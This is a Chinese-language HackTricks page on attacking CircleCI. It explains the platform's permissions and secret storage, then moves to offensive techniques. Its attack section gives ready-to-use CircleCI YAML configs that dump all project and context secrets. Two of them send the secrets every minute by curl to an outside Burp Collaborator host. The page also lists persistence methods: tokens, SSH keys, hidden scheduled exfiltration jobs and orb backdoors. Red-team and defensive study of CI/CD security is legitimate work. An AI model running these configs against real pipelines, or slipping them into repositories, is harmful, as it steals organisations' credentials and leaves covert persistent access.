# CircleCI安全

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)是一个持续集成平台，您可以使用它来**定义模板**，指示它对一些代码做什么以及何时执行。这样，您可以直接**从您的存储库主分支自动化测试**或**部署**。

## 权限

**CircleCI** **继承了**与登录相关的**github和bitbucket权限**。\
在我的测试中，我发现只要您在github上对存储库具有**写权限**，您就可以在CircleCI中**管理其项目设置**（设置新的ssh密钥，获取项目api密钥，创建具有新CircleCI配置的新分支...）。

但是，您需要是**存储库管理员**才能**将存储库转换为CircleCI项目**。

## 环境变量和秘密

根据[**文档**](https://circleci.com/docs/2.0/env-vars/)，有不同的方法可以在工作流程中**加载环境变量的值**。

### 内置环境变量

由CircleCI运行的每个容器将始终具有[**文档中定义的特定环境变量**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)，如`CIRCLE_PR_USERNAME`，`CIRCLE_PROJECT_REPONAME`或`CIRCLE_USERNAME`。

### 明文

您可以在**命令**中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
您可以在**运行环境**内以明文形式声明它们：
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
您可以在**build-job环境**中以明文形式声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
您可以在容器的**环境**中以明文形式声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### 项目机密

这些是只能被项目（任何分支）访问的**机密**。\
您可以在_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_中查看它们的声明。

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**导入变量**"功能允许从其他项目导入变量到此项目。
{% endhint %}

### 上下文机密

这些是**组织范围**的机密。默认情况下，任何存储在此处的机密都可以被**任何存储库**访问：

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
但请注意，可以选择不同的组（而不是所有成员）来**仅授予特定人员访问机密**。\
这目前是增加机密安全性的最佳方式之一，不允许每个人都访问，而只允许某些人访问。
{% endhint %}

## 攻击

### 搜索明文机密

如果您可以**访问版本控制系统**（如 github），请检查每个存储库的每个分支的`.circleci/config.yml`文件，并**搜索**其中存储的潜在**明文机密**。

### 机密环境变量和上下文枚举

通过检查代码，您可以找到每个`.circleci/config.yml`文件中使用的**所有机密名称**。您还可以从这些文件中获取**上下文名称**，或在 Web 控制台中检查它们：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### 外泄项目机密

{% hint style="warning" %}
为了**外泄所有**项目和上下文**机密**，您只需对整个 github 组织中的**1个存储库**具有**写入**访问权限（_并且您的帐户必须具有访问上下文的权限，但默认情况下每个人都可以访问每个上下文_）。
{% endhint %}

{% hint style="danger" %}
"**导入变量**"功能允许**从其他项目导入变量**到此项目。因此，攻击者可以**从所有存储库导入所有项目变量**，然后**一起外泄所有这些变量**。
{% endhint %}

所有项目机密始终设置在作业的环境中，因此只需调用环境并将其编码为 base64 将会在**工作流 Web 日志控制台**中外泄机密：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
如果您**无法访问Web控制台**，但可以**访问存储库**，并且知道正在使用CircleCI，您可以**创建一个工作流**，该工作流**每分钟触发一次**，并将**机密信息传输到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### 泄露上下文秘密

您需要**指定上下文名称**（这也将泄露项目秘密）：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
如果您**无法访问Web控制台**，但可以**访问存储库**，并且知道正在使用CircleCI，您可以**修改一个每分钟触发**并**将机密信息传输到外部地址**的工作流程：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
仅在存储库中创建一个新的 `.circleci/config.yml` **并不足以触发 CircleCI 构建**。您需要在 CircleCI 控制台中**将其启用为一个项目**。
{% endhint %}

### 逃逸至云端

**CircleCI** 提供了在**他们的机器上或在您自己的机器上运行构建的选项**。\
默认情况下，他们的机器位于 GCP，最初您可能找不到任何相关信息。但是，如果受害者在**他们自己的机器上运行任务（可能是在云环境中）**，您可能会发现一个**包含有趣信息的云元数据端点**。

请注意，在前面的示例中，所有内容都是在一个 docker 容器中启动的，但您也可以**请求启动一个 VM 机器**（可能具有不同的云权限）:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
甚至是一个具有访问远程docker服务权限的docker容器：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 持久性

* 可以在CircleCI中**创建用户令牌**以使用用户权限访问API端点。
* _https://app.circleci.com/settings/user/tokens_
* 可以创建项目令牌以访问具有令牌给定权限的项目。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* 可以向项目添加SSH密钥。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 可以在意外项目中的隐藏分支中**创建定时任务**，每天泄露所有**上下文环境**变量。
* 或者在分支中创建/修改已知任务，每天泄露所有上下文和**项目机密**。
* 如果您是GitHub所有者，可以**允许未经验证的orbs**并在作业中配置一个作为**后门**。
* 您可以在某些任务中找到**命令注入漏洞**，通过**秘密**修改其值来**注入命令**。
